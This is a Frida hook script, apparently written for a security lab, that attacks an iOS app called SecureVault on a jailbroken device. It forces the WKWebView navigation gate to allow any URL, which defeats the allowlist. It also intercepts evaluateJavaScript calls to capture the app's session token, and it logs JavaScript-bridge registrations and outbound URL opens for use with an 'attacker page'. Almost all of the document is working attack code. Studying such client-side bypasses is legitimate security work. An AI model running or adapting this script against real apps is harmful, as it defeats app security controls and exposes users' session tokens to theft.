/* SecureVault — runtime bypass + observation hooks (jailbroken device).
 *
 * Usage:
 *   frida -U -f com.example.securevault -l hook.js
 *
 * What this proves:
 *   1. The Swift `decidePolicyFor` navigation gate is an @objc protocol
 *      method -> it has a real ObjC selector, so we can swizzle the decision
 *      block and force ALLOW for any URL (defeats the allowlist live).
 *   2. The native token is echoed to the page via `evaluateJavaScript:`.
 *      Hooking that call leaks the session token straight out of native.
 *   3. Every bridge message + every outbound open is logged.
 *
 * This defeats the checks WITHOUT touching the .ipa: it is the classic
 * "jailbreak => the client is not a trust boundary" result.
 */

if (!ObjC.available) {
  console.log('[!] Not an ObjC runtime — is this a real device app?');
} else {
  console.log('[*] SecureVault lab hooks loaded');

  // ---- helpers ------------------------------------------------------------

  // Swift classes are exposed to the ObjC runtime as "Module.Class".
  function findClass(shortName) {
    for (const name of Object.keys(ObjC.classes)) {
      if (name === shortName || name.endsWith('.' + shortName) ||
          name.endsWith('_' + shortName)) {
        return name;
      }
    }
    return null;
  }

  function hookAll(clsName, selName, impl) {
    if (!clsName) return false;
    const klass = ObjC.classes[clsName];
    if (!klass) return false;
    const m = klass['- ' + selName] || klass['+ ' + selName];
    if (!m) { console.log('  [-] ' + clsName + ' ' + selName + ' not found'); return false; }
    Interceptor.attach(m.implementation, impl);
    console.log('  [+] hooked ' + clsName + ' -[ ' + selName + ' ]');
    return true;
  }

  // ---- 1. navigate gate: force ALLOW --------------------------------------

  const WKNavigationActionPolicyCancel = 0;
  const WKNavigationActionPolicyAllow  = 1;

  const vcClass = findClass('ViewController');
  console.log('[*] ViewController -> ' + vcClass);

  hookAll(vcClass, 'webView:decidePolicyForNavigationAction:decisionHandler:', {
    onEnter(args) {
      // args[2] = navigationAction, args[3] = the Swift decisionHandler block.
      const navAction = new ObjC.Object(args[2]);
      let url = '(no url)';
      try {
        url = navAction.request().URL().absoluteString().toString();
      } catch (e) {}

      // Replace the block so it reports ALLOW no matter what the Swift code
      // decided. We build a block with the matching signature and pass it.
      const decisionHandler = args[3];
      // Original handler is a block; call it with allow instead.
      const block = new ObjC.Block(decisionHandler);
      const original = block.implementation;
      block.implementation = function (policy) {
        console.log('[+] forced ALLOW (was ' + policy + ') -> ' + url);
        return original.call(this, WKNavigationActionPolicyAllow);
      };
    }
  });

  // ---- 2. token leak via evaluateJavaScript --------------------------------

  if (ObjC.classes.WKWebView) {
    const evalSel = 'evaluateJavaScript:completionHandler:';
    const m = ObjC.classes.WKWebView['- ' + evalSel];
    if (m) {
      Interceptor.attach(m.implementation, {
        onEnter(args) {
          try {
            const js = new ObjC.Object(args[2]).toString(); // NSString JS source
            if (js.indexOf('__nativeCallback') !== -1) {
              console.log('[TOKEN LEAK] native evaluated JS: ' + js);
            }
          } catch (e) {}
        }
      });
      console.log('  [+] hooked WKWebView -[ ' + evalSel + ' ]');
    }
  }

  // ---- 3. log every bridge message ----------------------------------------

  // The bridge is the WKScriptMessageHandler. Observe messages arriving by
  // hooking WKScriptMessage's body accessor is noisy; instead watch the
  // controller registration to confirm the channel name.
  if (ObjC.classes.WKUserContentController) {
    const sel = 'addScriptMessageHandler:name:';
    const m = ObjC.classes.WKUserContentController['- ' + sel];
    if (m) {
      Interceptor.attach(m.implementation, {
        onEnter(args) {
          try {
            const name = new ObjC.Object(args[3]).toString();
            console.log('[*] bridge registered: messageHandlers.' + name);
          } catch (e) {}
        }
      });
    }
  }

  // ---- 4. outbound opens (openExternal sink / external redirect) -----------

  if (ObjC.classes.UIApplication) {
    const sel = 'openURL:options:completionHandler:';
    const m = ObjC.classes.UIApplication['- ' + sel];
    if (m) {
      Interceptor.attach(m.implementation, {
        onEnter(args) {
          try {
            const u = new ObjC.Object(args[2]).absoluteString().toString();
            console.log('[openExternal] ' + u);
          } catch (e) {}
        }
      });
    }
  }

  console.log('[*] done — interact with the app / load the attacker page.');
}
